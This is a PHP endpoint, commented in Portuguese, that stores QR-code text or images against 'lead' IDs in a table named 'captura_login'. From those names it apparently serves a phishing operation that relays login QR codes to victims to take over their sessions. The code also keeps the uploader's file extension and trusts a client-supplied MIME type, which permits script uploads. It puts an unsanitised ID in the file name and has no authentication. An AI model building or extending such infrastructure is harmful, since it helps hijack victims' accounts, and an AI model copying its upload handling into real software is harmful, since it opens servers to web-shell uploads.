<?php
// Define que a resposta será em formato JSON
header('Content-Type: application/json');

// Inclui o seu arquivo de conexão com o banco de dados
require_once __DIR__ . '/db.php';

// --- PASSO 1: VALIDAÇÃO DO DADO EM COMUM (ID DO LEAD) ---
if (!isset($_POST['lead_id'])) {
    echo json_encode(['success' => false, 'error' => 'ID do lead não fornecido.']);
    exit;
}
$lead_id = $_POST['lead_id'];

// --- PASSO 2: LÓGICA INTELIGENTE PARA DECIDIR O QUE FAZER ---

// ---- CENÁRIO A: TEXTO DO QR CODE FOI ENVIADO (Pelo "Colar" do Admin) ----
if (isset($_POST['qrcode_text']) && !empty($_POST['qrcode_text'])) {
    
    $qrcode_text = $_POST['qrcode_text'];
    
    try {
        // Atualiza a coluna 'qrcode_text' no banco de dados
        $sql = "UPDATE captura_login SET qrcode_text = ?, status = 'qr_enviado' WHERE id = ?";
        $stmt = $pdo->prepare($sql);
        
        if ($stmt->execute([$qrcode_text, $lead_id])) {
            echo json_encode(['success' => true, 'message' => 'Texto do QR Code salvo com sucesso.']);
        } else {
            echo json_encode(['success' => false, 'error' => 'Falha ao salvar o texto do QR Code no banco de dados.']);
        }
    } catch (PDOException $e) {
        http_response_code(500);
        echo json_encode(['success' => false, 'error' => 'Erro de banco de dados: ' . $e->getMessage()]);
    }
    exit; // Termina a execução após processar o texto
}

// ---- CENÁRIO B: IMAGEM DO QR CODE FOI ENVIADA (Pela Extensão) ----
else if (isset($_FILES['qrcode_image']) && $_FILES['qrcode_image']['error'] === UPLOAD_ERR_OK) {
    
    $file = $_FILES['qrcode_image'];

    // Validação do tipo de arquivo de imagem
    $allowed_types = ['image/png', 'image/jpeg', 'image/gif'];
    if (!in_array($file['type'], $allowed_types)) {
        echo json_encode(['success' => false, 'error' => 'Tipo de arquivo de imagem inválido.']);
        exit;
    }

    // Lógica para salvar o arquivo no servidor
    $upload_dir = 'qrcodes/';
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    $file_extension = pathinfo($file['name'], PATHINFO_EXTENSION) ?: 'png';
    $file_name = 'qr_' . $lead_id . '_' . time() . '.' . $file_extension;
    $file_path = $upload_dir . $file_name;

    // Move o arquivo e atualiza o banco de dados se tiver sucesso
    if (move_uploaded_file($file['tmp_name'], $file_path)) {
        try {
            // Atualiza a coluna 'qrcode_path' no banco de dados
            $sql = "UPDATE captura_login SET qrcode_path = ?, status = 'qr_enviado' WHERE id = ?";
            $stmt = $pdo->prepare($sql);
            $stmt->execute([$file_path, $lead_id]);

            echo json_encode(['success' => true, 'path' => $file_path]);
        } catch (PDOException $e) {
            http_response_code(500);
            echo json_encode(['success' => false, 'error' => 'Erro de banco de dados: ' . $e->getMessage()]);
        }
    } else {
        http_response_code(500);
        echo json_encode(['success' => false, 'error' => 'Falha ao salvar o arquivo da imagem no servidor.']);
    }
    exit; // Termina a execução após processar a imagem
}

// ---- CENÁRIO C: NENHUM DADO VÁLIDO FOI ENVIADO ----
else {
    echo json_encode(['success' => false, 'error' => 'Dados do QR Code incompletos. Envie o texto ou a imagem.']);
    exit;
}
?>